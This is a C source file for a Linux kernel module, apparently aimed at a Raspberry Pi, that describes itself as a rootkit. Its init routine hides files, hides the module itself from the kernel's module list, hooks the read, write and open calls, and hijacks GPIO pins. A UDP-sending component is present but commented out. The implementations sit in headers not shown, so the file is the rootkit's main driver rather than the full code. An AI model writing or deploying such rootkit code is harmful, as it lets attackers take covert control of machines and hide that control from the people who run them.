#include <linux/module.h>

//#include <linux/init.h>
//#include <linux/init.h>
//#include <linux/kernel.h>
//#include <linux/sched.h>

//#include <linux/uaccess.h> // For copy_from_user

#include "file_hiding.h"
#include "read_hooking.h"
#include "write_hooking.h"
#include "open_hooking.h"
#include "gpio_hijacking.h"
#include "send_UDP.h"
#include "module_hiding.h"
#include "hack_pi.h"

static int hack_init(void)
{
	init_file_hiding();
	//init_module_hiding();
	hide_module(&__this_module);
	init_write_hooking();
	init_open_hooking();
	init_gpio_hijacking();
	init_read_hooking();
	//init_udp();
	printk("\n[ROOTKIT] Installing... \n");
	return 0;
}

static void hack_end(void)
{
	finalize_file_hiding();
	//finalize_module_hiding();
	finalize_write_hooking();
	finalize_open_hooking();
	finalize_gpio_hijacking();
	finalize_read_hooking();
	//finalize_udp();
	printk("\nEnding module...\n");
}

module_init(hack_init);
module_exit(hack_end);

MODULE_LICENSE("GPL");
